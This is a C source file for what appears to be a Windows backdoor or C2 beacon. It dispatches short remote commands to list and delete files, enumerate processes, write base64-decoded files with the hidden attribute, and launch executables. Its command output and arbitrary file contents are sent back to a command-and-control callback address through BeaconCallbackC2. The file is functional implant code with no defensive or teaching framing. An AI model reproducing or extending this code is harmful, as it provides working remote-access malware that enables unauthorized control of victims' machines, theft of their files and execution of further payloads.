#include "main.h"

char* changedir(char* Dir){
	DWORD ret;
	char* oBuffer;

	oBuffer = hAlloc(260);
	ret = API(KERNEL32, SetCurrentDirectoryA)(Dir);
	if (ret == 0){
		mysprintf(oBuffer,"ERROR:%d\n",API(KERNEL32,GetLastError)());
		return oBuffer;
	}
	mysprintf(oBuffer,"Dir Changed to: %s\n",Dir);
	return oBuffer;
}

char* getdir(){
	DWORD ret;
	char* text = hAlloc(MAX_PATH+1);
	ret = API(KERNEL32, GetCurrentDirectoryA)(MAX_PATH, text);
	//API(USER32,wsprintfA)(text, "%s\n",NPath);
	return text;
}

char* listDirectory(char* Dir){
 	WIN32_FIND_DATA data;
 	HANDLE hFind = INVALID_HANDLE_VALUE;
 	char* cp, *dir;
 	char szDir[MAX_PATH];
 	int fsize, bufsize, lasterr;

 	dir = hAlloc(2048);
 	mysprintf(szDir, "%s\\*", Dir);
 	hFind = API(KERNEL32,FindFirstFileA)(szDir, &data);

 	if(hFind != INVALID_HANDLE_VALUE){
 		cp = dir;
 		bufsize = 2048;

 		memoryset(dir,0,2048);
 		do{	
 			if (bufsize < 1){
 				break;
 			}
 			if(data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY){
 				mysprintf(cp, "[DIR] %s\n", data.cFileName);
 				fsize = mystrlen(data.cFileName)+7;
 				cp += fsize;
 				bufsize -= fsize;
 			}
 			else{
 				mysprintf(cp, "[FILE] %s\n", data.cFileName);
 				fsize = mystrlen(data.cFileName)+8;
 				cp += fsize;
 				bufsize -= fsize;
 			}
 		}while(API(KERNEL32,FindNextFileA)(hFind, &data));
 		API(KERNEL32, FindClose)(hFind);
 		return dir;
 	}
 	lasterr = API(KERNEL32,GetLastError)();
 	mysprintf(dir,"ERROR:%d\n",lasterr);
	return dir;
}

static char* uploadFile(char* szFile, size_t* fileSize){
	HANDLE hFile;
 	DWORD fsize = 0;
 	char* fcontent = NULL, *errbuf = NULL;

 	hFile = API(KERNEL32,CreateFileA)((LPCSTR)szFile, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
	if (hFile == INVALID_HANDLE_VALUE){
		char* errbuf = hAlloc(MAX_PATH+100);
		switch(API(KERNEL32,GetLastError)()){
		case 2:
			mysprintf(errbuf,"ERROR: file %s not found\n",szFile);
			return errbuf;
		case 5:
			mysprintf(errbuf,"ERROR: Access to %s is denied\n",szFile);
			return errbuf;
		default:
			mysprintf(errbuf,"ERROR: Invalid File %s\n",szFile);
			return errbuf;
		}
	}
	fsize = API(KERNEL32, GetFileSize)(hFile, NULL);
	*fileSize = fsize;

	if (fsize != 0){
		DWORD bytesRead = 0;
		BOOL res;

		fcontent = hAlloc(fsize+1);
		res = API(KERNEL32,ReadFile)(hFile, fcontent, fsize, &bytesRead, NULL);
		API(KERNEL32, CloseHandle)(hFile);	
		fcontent[fsize] = '\0';
		return fcontent;
	}
	API(KERNEL32, CloseHandle)(hFile);
	errbuf = hAlloc(MAX_PATH+100);
	mysprintf(errbuf,"ERROR: File %s O-bytes\n",szFile);
	return errbuf;
}

char* downloadFile(char* Base64Buffer){
	size_t out_len, b64_len;
	char* b64_out, *fileName, *Bytes, *errbuf = NULL;
	HANDLE hFile;
	DWORD dwWritten;

	fileName = split(Base64Buffer);
	Bytes = mystrstr(Base64Buffer, "|") +1;
	out_len = mystrlen(Bytes);
	b64_len = b64_decoded_size(Bytes);
	b64_out = base64_decode(Bytes, out_len, &out_len);
	errbuf = hAlloc(MAX_PATH+100);

	if (!b64_out){
		mysprintf(errbuf, "Error: b64_decode %d\n", API(KERNEL32,GetLastError)());
		goto sendError;
	}
	hFile = API(KERNEL32,CreateFileA)(fileName, GENERIC_WRITE, FILE_SHARE_READ, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, 0);

	if (hFile != INVALID_HANDLE_VALUE){
		if(!API(KERNEL32, WriteFile)(hFile, b64_out, b64_len, &dwWritten, 0)){
			mysprintf(errbuf, "Error: File %d\n", API(KERNEL32,GetLastError)());
			goto sendError;
		}
		mysprintf(errbuf, "Written: File %s %u-bytes\n", fileName, b64_len);
	}

sendError:
	if (hFile){
		API(KERNEL32, CloseHandle)(hFile);
	}
	if (b64_out){
		hFree(b64_out);
	}
	hFree(fileName);
	return errbuf;
}

char* executeFile(char* Bytes){
	char* errbuf, *cmdLine, *fileName = NULL;
	STARTUPINFO si;
	PROCESS_INFORMATION pi;

	memoryset(&si, 0, sizeof(si));
	si.cb = sizeof(si);
	memoryset(&pi, 0, sizeof(pi));
	errbuf = hAlloc(MAX_PATH+100);

	fileName = split(Bytes);
	cmdLine = mystrstr(Bytes, "|") +1;

	if(!*cmdLine){
		cmdLine = NULL;
	}
	if(!API(KERNEL32, CreateProcessA)(fileName, cmdLine, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)){
		mysprintf(errbuf, "Failed Execution: %d\n", API(KERNEL32,GetLastError)());
		goto returnFile;
	}
	mysprintf(errbuf, "File: %s executed successfully.\n", fileName);

returnFile:
	hFree(fileName);
	return errbuf;
}

char* removefile(char* szFileName){
 	DWORD ret;
 	char* errbuf = hAlloc(260);

 	ret = API(KERNEL32,DeleteFileA)(szFileName);
 	if (ret == 0){
 		switch(API(KERNEL32,GetLastError)()){
 		case 3:
			mysprintf(errbuf,"ERROR: file %s not found\n",szFileName);
			return errbuf;
		case 5:
			mysprintf(errbuf,"ERROR: Access to %s is denied\n",szFileName);
			return errbuf;
		default:
			mysprintf(errbuf,"ERROR: Invalid %s\n",szFileName);
			return errbuf;
 		}
 	}
 	mysprintf(errbuf,"Deleted: %s\n",szFileName);
	return errbuf;
}

char* getps(){
 	PROCESSENTRY32 pe32;
 	char* text = hAlloc(4096), *cp;
 	HANDLE hProcSnap;
 	DWORD size = 4096;
 
 	hProcSnap = API(KERNEL32,CreateToolhelp32Snapshot)(TH32CS_SNAPPROCESS, 0);
 	if (INVALID_HANDLE_VALUE == hProcSnap){
 		mysprintf(text,"Failed\n",NULL);  
 		return text; 
 	}
 	pe32.dwSize = sizeof(PROCESSENTRY32);
 	if (!API(KERNEL32,Process32First)(hProcSnap, &pe32)){
		API(KERNEL32, CloseHandle)(hProcSnap);
		mysprintf(text,"Failed\n",NULL); 
		return text;
	}
	cp = text;
	do{
		mysprintf(cp, "%s\n",pe32.szExeFile);
		cp += mystrlen(pe32.szExeFile)+1;
		size -= mystrlen(pe32.szExeFile)+1;
		if(size < 20){
			break;
		}
	}while(API(KERNEL32,Process32Next)(hProcSnap, &pe32));
	return text;
}


int stlswitch(char* cmd){
   if(mystrstr(cmd, "dir") == cmd) return 1;
   else if(mystrstr(cmd, "cdi") == cmd) return 3;
   else if(mystrstr(cmd, "rmv") == cmd) return 4;
   else if(mystrstr(cmd, "cng") == cmd) return 5;
   else if(mystrstr(cmd, "who") == cmd) return 6;
   else if(mystrstr(cmd, "gps") == cmd) return 7;
   else if(mystrstr(cmd, "dwd") == cmd) return 8;
   else if(mystrstr(cmd, "run") == cmd) return 9;
   else return 0;
}


 //declare global function
BOOL Stdlib(char* Buffer){
	char* data;
	char cmd[4];
	//3 letter command and then a space then args
	mymemcpy(cmd, Buffer,3);
	cmd[3] = '\0';

	switch(stlswitch(cmd)){
	case 1:
		data = listDirectory(Buffer+4);
		break;
	case 2:
		break;
	case 3:
		data = getdir();
		break;
	case 4:
		data = removefile(Buffer+4);
		break;
	case 5:
		data = changedir(Buffer+4);
		break;
	case 6:
		data = systemFunction();
		break;
	case 7:
		data = getps();
		break;
	case 8:
		data = downloadFile(Buffer+4);
		break;
	case 9:
		data = executeFile(Buffer+4);
		break;
	default:
		break;
	}
	if (data){
		BeaconCallbackC2(_C2_CALLBACK_ADDRESS, 0, _CALLBACK_URL, DO_CALLBACK, data, mystrlen(data));
		hFree(data);
	}
	return TRUE;
}

BOOL fUpload(char* Buffer){
	char* data;
	size_t fileSize = 0;

	data = uploadFile(Buffer, &fileSize);
	if (data){
		BeaconCallbackC2(_C2_CALLBACK_ADDRESS, 0, _CALLBACK_URL, DO_CALLBACK, data, fileSize);
		hFree(data);
	}
	return TRUE;
}
